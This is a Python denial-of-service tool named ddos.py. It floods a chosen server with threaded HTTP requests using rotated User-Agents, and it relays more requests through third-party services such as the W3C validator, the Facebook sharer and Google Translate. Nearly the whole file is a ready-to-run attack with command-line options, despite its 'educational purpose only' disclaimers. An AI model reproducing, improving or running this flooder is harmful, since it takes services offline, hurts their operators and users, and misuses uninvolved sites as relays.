#  ⚠️ WARNING: DO NOT USE THIS SCRIPT ON PUBLIC NETWORKS OR SERVERS YOU DO NOT OWN
#  Legal use is restricted to controlled environments with explicit permission.

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

# Rotating User-Agents
def user_agent():
    global uagent
    uagent = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 Chrome/89.0.4389.72 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 Safari/605.1.15",
        "curl/7.68.0",
        "Wget/1.20.3 (linux-gnu)"
    ]
    return uagent

# Bot-like sources
def my_bots():
    global bots
    bots = [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://www.google.com/translate?u="
        "http://archive.is/?url=",
        "http://web.archive.org/save/"
    ]
    return bots

# Simulated bot hammering
def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
# TCP flood with headers
# def down_it(item):
#     try:
#         while True:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.settimeout(3)
#             sock.connect((host, port))
#             packet = (
#                 f"GET / HTTP/1.1\r\n"
#                 f"Host: {host}\r\n"
#                 f"User-Agent: {random.choice(uagent)}\r\n"
#                 f"Accept: */*\r\n"
#                 f"Connection: keep-alive\r\n"
#                 f"{data}\r\n\r\n"
#             ).encode('utf-8')
#             sock.send(packet)
#             print(f"\033[92m[Packet] Sent -> {host}:{port} @ {time.ctime()}\033[0m")
#             sock.shutdown(socket.SHUT_WR)
#             sock.close()
#             time.sleep(0.1)
#     except socket.error as e:
#         print(f"\033[91m[Error] Socket: {e}\033[0m")
#         time.sleep(0.5)
def down_it(item):
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            try:
                sock.connect((host, port))
                packet = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(uagent)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"{data}\r\n\r\n"
                ).encode('utf-8')
                sock.send(packet)
                print(f"\033[92m[Packet] Sent -> {host}:{port} @ {time.ctime()}\033[0m")
                sock.shutdown(socket.SHUT_WR)
            except socket.error as e:
                print(f"\033[91m[Error] Socket: {e}\033[0m")
            finally:
                sock.close()
                time.sleep(0.1)
    except Exception as e:
        print(f"\033[91m[Unhandled Error] {e}\033[0m")
        time.sleep(0.5)



def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()

# Usage
def usage():
    print(''' \033[92m
Educational Purpose Only

⚠️ Misuse may lead to legal penalties. Use only on systems you own or control./n
Created By: ~HAXOR~



Usage : python3 ddos.py [-s] [-p] [-t]
    -h : help
    -s : server IP address
    -p : port (default: 80)
    -t : turbo (threads, default: 135)
\033[0m''')
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item

    optp = OptionParser(add_help_option=False)
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="Target server IP")
    optp.add_option("-p", "--port", type="int", dest="port", help="Port (default 80)")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="Thread count (default 135)")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="Show help")
    opts, args = optp.parse_args()

    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host:
        host = opts.host
    else:
        usage()
    port = opts.port if opts.port else 80
    thr = opts.turbo if opts.turbo else 135


global data
try:
    with open("headers.txt", "r") as headers:
        data = headers.read()
except FileNotFoundError:
    print("\033[91mMissing 'headers.txt'. Create it to define extra headers.\033[0m")
    sys.exit()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()

    print(f"\033[92m[Target] {host}:{port} | Threads: {thr}\033[0m")
    print("\033[94m[!] Starting in 5 seconds...\033[0m")
    user_agent()
    my_bots()
    time.sleep(5)


    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.connect((host, port))
        test_sock.settimeout(1)
        test_sock.close()
    except socket.error:
        print("\033[91m[!] Connection failed. Check target.\033[0m")
        usage()

   
    q = Queue()
    w = Queue()

    for i in range(thr):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
        t2 = threading.Thread(target=dos2)
        t2.daemon = True
        t2.start()

    item = 0
    while True:
        if item > 1800:
            item = 0
            time.sleep(0.1)
        item += 1
        q.put(item)
        w.put(item)
    q.join()
    w.join()
